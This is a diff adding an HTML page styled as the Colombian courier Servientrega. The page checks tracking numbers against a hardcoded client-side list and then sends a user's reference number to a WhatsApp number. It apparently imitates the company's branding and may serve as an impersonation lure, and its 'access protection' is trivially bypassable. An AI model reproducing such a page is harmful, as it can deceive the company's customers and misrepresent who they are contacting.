@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Servientrega | Acceso Protegido</title>
+  <style>
+    :root {
+      --verde-servientrega: #009739;
+      --verde-oscuro: #00692f;
+      --gris-claro: #f4f4f4;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--gris-claro);
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    header {
+      background-color: var(--verde-servientrega);
+      color: white;
+      text-align: center;
+      padding: 30px 20px;
+    }
+
+    header img.logo {
+      width: 180px;
+      height: auto;
+      margin-bottom: 10px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      border: 3px solid white;
+    }
+
+    .container {
+      max-width: 600px;
+      background: white;
+      margin: 30px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      margin-top: 0;
+      color: var(--verde-servientrega);
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: var(--verde-servientrega);
+      color: white;
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: var(--verde-oscuro);
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .galeria {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 15px;
+      margin-top: 30px;
+    }
+
+    .galeria img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+      object-fit: cover;
+    }
+
+    .info {
+      margin-top: 40px;
+      background-color: #e8f5ee;
+      padding: 20px;
+      border-left: 5px solid var(--verde-servientrega);
+      border-radius: 8px;
+      line-height: 1.6;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="SERVIENTREGA.jpg" alt="Logo de Servientrega" class="logo" />
+    <h1>Acceso Protegido</h1>
+  </header>
+
+  <div class="container">
+    <!-- Paso 1 -->
+    <h2>Paso 1: Ingrese el Número de Guía</h2>
+    <div class="error hidden" id="clave-error">Número de Guía incorrecto. Intente nuevamente.</div>
+    <input type="text" id="clave" placeholder="Ingrese su Número de Guía (20 dígitos)" maxlength="20" />
+    <button onclick="verificarClave()">Verificar</button>
+
+    <!-- Paso 2 -->
+    <div id="paso-2" class="hidden">
+      <h2>Paso 2: Solicite su Guía</h2>
+      <input type="text" id="referencia" placeholder="Ingrese su Número de Referencia" />
+      <button onclick="enviarWhatsApp()">Solicitar Guía por WhatsApp</button>
+    </div>
+
+    <!-- Galería de Imágenes -->
+    <div class="galeria">
+      <img src="1.jpg" alt="Imagen 1" />
+      <img src="2.jpg" alt="Imagen 2" />
+      <img src="3.jpg" alt="Imagen 3" />
+      <img src="4.jpg" alt="Imagen 4" />
+    </div>
+
+    <!-- Información adicional -->
+    <div class="info">
+      <h3>¿Qué es Servientrega?</h3>
+      <p><strong>Servientrega</strong> es una de las empresas líderes en logística, mensajería y soluciones de transporte de documentos y paquetes en Colombia y varios países de América Latina. Con décadas de experiencia, ofrece servicios confiables tanto a personas como a empresas.</p>
+
+      <p>Servicios destacados:</p>
+      <ul>
+        <li>Envío de documentos y paquetes nacionales e internacionales</li>
+        <li>Logística empresarial y soluciones personalizadas</li>
+        <li>Seguimiento en tiempo real</li>
+        <li>Atención personalizada vía WhatsApp y puntos físicos</li>
+      </ul>
+      <p>Para mayor información, visite <a href="https://www.servientrega.com" target="_blank">www.servientrega.com</a>.</p>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 Servientrega. Todos los derechos reservados.
+  </footer>
+
+  <script>
+    // Lista de 20 Números de Guía válidos (todos de 20 dígitos)
+    const guiasValidas = [
+      "00000011111122222333",
+      "12345678901234567890",
+      "11112222333344445555",
+      "99998888777766665555",
+      "55556666777788889999",
+      "00001111222233334444",
+      "88889999000011112222",
+      "11223344556677889900",
+      "10101010101010101010",
+      "20202020202020202020",
+      "30303030303030303030",
+      "40404040404040404040",
+      "50505050505050505050",
+      "60606060606060606060",
+      "70707070707070707070",
+      "80808080808080808080",
+      "90909090909090909090",
+      "11110000111100001111",
+      "22220000222200002222",
+      "33330000333300003333"
+    ];
+
+    function verificarClave() {
+      const claveIngresada = document.getElementById("clave").value.trim();
+      const errorMsg = document.getElementById("clave-error");
+      const paso2 = document.getElementById("paso-2");
+
+      if (guiasValidas.includes(claveIngresada)) {
+        errorMsg.classList.add("hidden");
+        paso2.classList.remove("hidden");
+      } else {
+        errorMsg.classList.remove("hidden");
+        paso2.classList.add("hidden");
+      }
+    }
+
+    function enviarWhatsApp() {
+      const numeroReferencia = document.getElementById("referencia").value.trim();
+      if (!numeroReferencia) {
+        alert("Por favor, ingrese un Número de Referencia.");
+        return;
+      }
+      const mensaje = `Solicito mi Guía. Número de Referencia: ${numeroReferencia}`;
+      const numeroWhatsApp = "573146495450";
+      const url = `https://wa.me/${numeroWhatsApp}?text=${encodeURIComponent(mensaje)}`;
+      window.open(url, "_blank");
+    }
+  </script>
+
+</body>
+</html>
